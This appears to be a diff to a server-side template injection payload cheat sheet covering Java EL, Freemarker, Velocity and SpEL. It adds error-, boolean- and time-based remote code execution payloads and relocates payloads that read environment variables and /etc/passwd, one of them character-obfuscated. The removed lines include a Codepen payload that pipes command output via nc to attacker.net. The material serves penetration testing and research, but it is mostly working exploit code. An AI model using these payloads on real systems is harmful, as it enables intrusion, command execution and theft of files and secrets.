@@ -5,17 +5,15 @@
 ## Summary
 
 - [Templating Libraries](#templating-libraries)
-- [Java](#java)
-    - [Java - Basic Injection](#java---basic-injection)
-    - [Java - Retrieve Environment Variables](#java---retrieve-environment-variables)
-    - [Java - Retrieve /etc/passwd](#java---retrieve-etcpasswd)
+- [Java EL](#java-el)
+    - [Java EL - Basic Injection](#java-el---basic-injection)
+    - [Java EL - Code Execution](#java-el---code-execution)
 - [Freemarker](#freemarker)
     - [Freemarker - Basic Injection](#freemarker---basic-injection)
     - [Freemarker - Read File](#freemarker---read-file)
     - [Freemarker - Code Execution](#freemarker---code-execution)
     - [Freemarker - Code Execution with Obfuscation](#freemarker---code-execution-with-obfuscation)
     - [Freemarker - Sandbox Bypass](#freemarker---sandbox-bypass)
-- [Codepen](#codepen)
 - [Jinjava](#jinjava)
     - [Jinjava - Basic Injection](#jinjava---basic-injection)
     - [Jinjava - Command Execution](#jinjava---command-execution)
@@ -32,6 +30,8 @@
     - [Groovy - Sandbox Bypass](#groovy---sandbox-bypass)
 - [Spring Expression Language](#spring-expression-language)
     - [SpEL - Basic Injection](#spel---basic-injection)
+    - [SpEL - Retrieve Environment Variables](#spel---retrieve-environment-variables)
+    - [SpEL - Retrieve /etc/passwd](#spel---retrieve-etcpasswd)
     - [SpEL - DNS Exfiltration](#spel---dns-exfiltration)
     - [SpEL - Session Attributes](#spel---session-attributes)
     - [SpEL - Command Execution](#spel---command-execution)
@@ -39,20 +39,22 @@
 
 ## Templating Libraries
 
-| Template Name | Payload Format |
-| ------------ | --------- |
-| Codepen    | `#{}`     |
-| Freemarker | `${3*3}`, `#{3*3}`, `[=3*3]` |
-| Groovy     | `${9*9}`  |
-| Jinjava    | `{{ }}`   |
-| Pebble     | `{{ }}`   |
-| Spring     | `*{7*7}`  |
-| Thymeleaf  | `[[ ]]`   |
-| Velocity   | `#set($X="") $X`             |
+| Template Name | Payload Format         |
+|---------------|------------------------|
+| Codepen       | `#{ }`                 |
+| Freemarker    | `${ }`, `#{ }`, `[= ]` |
+| Groovy        | `${ }`                 |
+| Jinjava       | `{{ }}`                |
+| Pebble        | `{{ }}`                |
+| Spring        | `*{ }`                 |
+| Thymeleaf     | `[[ ]]`                |
+| Velocity      | `#set($X="") $X`       |
 
-## Java
+## Java EL
 
-### Java - Basic Injection
+### Java EL - Basic Injection
+
+Java has multiple Expression Languages using similar syntax.
 
 > Multiple variable expressions can be used, if `${...}` doesn't work try `#{...}`, `*{...}`, `@{...}` or `~{...}`.
 
@@ -64,18 +66,14 @@ ${class.getResource("").getPath()}
 ${class.getResource("../../../../../index.htm").getContent()}
 ```
 
-### Java - Retrieve Environment Variables
+### Java EL - Code Execution
 
 ```java
-${T(java.lang.System).getenv()}
-```
+${''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes())} // Rendered RCE
+${''.getClass().forName('java.lang.Integer').valueOf('x'+''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes()))} // Error-Based RCE
+${1/((''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor()==0)?1:0)+''} // Boolean-Based RCE
+${(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor().equals(0)?(''.getClass().forName('java.lang.Thread')).sleep(5000):0).toString()} // Time-Based RCE
 
-### Java - Retrieve /etc/passwd
-
-```java
-${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
-
-${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
 ```
 
 ---
@@ -110,6 +108,10 @@ Convert the returned bytes to ASCII
 ${"freemarker.template.utility.Execute"?new()("id")}
 #{"freemarker.template.utility.Execute"?new()("id")}
 [="freemarker.template.utility.Execute"?new()("id")]
+
+${("xx"+("freemarker.template.utility.Execute"?new()("id")))?new()} // Error-Based RCE
+${1/((freemarker.template.utility.Execute"?new()(" … && echo UniqueString")?chop_linebreak?ends_with("UniqueString"))?string('1','0')?eval)} // Boolean-Based RCE
+${"freemarker.template.utility.Execute"?new()("id && sleep 5")} // Time-Based RCE
 ```
 
 ### Freemarker - Code Execution with Obfuscation
@@ -136,24 +138,6 @@ Reference and explanation of payload can be found [yeswehack/server-side-templat
 <#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
 <#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
 ${dwf.newInstance(ec,null)("id")}
-```
-
----
-
-## Codepen
-
-[Official website](https://codepen.io/)
->
-
-```python
-- var x = root.process
-- x = x.mainModule.require
-- x = x('child_process')
-= x.exec('id | nc attacker.net 80')
-```
-
-```javascript
-#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
 ```
 
 ---
@@ -275,6 +259,41 @@ A more flexible and stealthy payload that supports base64-encoded commands, allo
 #end
 ```
 
+Error-Based RCE payload:
+
+```java
+#set($s="")
+#set($sc=$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()))
+#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id")
+#set($n=$p.waitFor())
+#set($b="Y:/A:/"+$sc.newInstance($p.inputStream.readAllBytes(), "UTF-8"))
+#include($b)
+```
+
+Boolean-Based RCE payload:
+
+```java
+#set($s="")
+#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
+#set($n=$p.waitFor())
+#set($r=$p.exitValue())
+#if($r != 0)
+#include("Y:/A:/xxx")
+#end
+```
+
+Time-Based RCE payload:
+
+```java
+#set($s="")
+#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
+#set($n=$p.waitFor())
+#set($r=$p.exitValue())
+#if($r != 0)
+#set($t=$s.getClass().forName("java.lang.Thread").sleep(5000))
+#end
+```
+
 ---
 
 ## Groovy
@@ -340,6 +359,8 @@ ${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(val
 
 ## Spring Expression Language
 
+> Java EL payloads also work for SpEL
+
 [Official website](https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html)
 
 > The Spring Expression Language (SpEL for short) is a powerful expression language that supports querying and manipulating an object graph at runtime. The language syntax is similar to Unified EL but offers additional features, most notably method invocation and basic string templating functionality.
@@ -349,6 +370,20 @@ ${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(val
 ```java
 ${7*7}
 ${'patt'.toString().replace('a', 'x')}
+```
+
+### SpEL - Retrieve Environment Variables
+
+```java
+${T(java.lang.System).getenv()}
+```
+
+### SpEL - Retrieve /etc/passwd
+
+```java
+${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
+
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
 ```
 
 ### SpEL - DNS Exfiltration
@@ -421,3 +456,4 @@ ${pageContext.request.getSession().setAttribute("admin",true)}
 - [Server-Side Template Injection: RCE For The Modern Web App (PDF) - James Kettle (@albinowax) - August 8, 2015](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
 - [Server-Side Template Injection: RCE For The Modern Web App (Video) - James Kettle (@albinowax) - December 28, 2015](https://www.youtube.com/watch?v=3cT0uE7Y87s)
 - [VelocityServlet Expression Language injection - MagicBlue - November 15, 2017](https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/)
+- [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 03, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
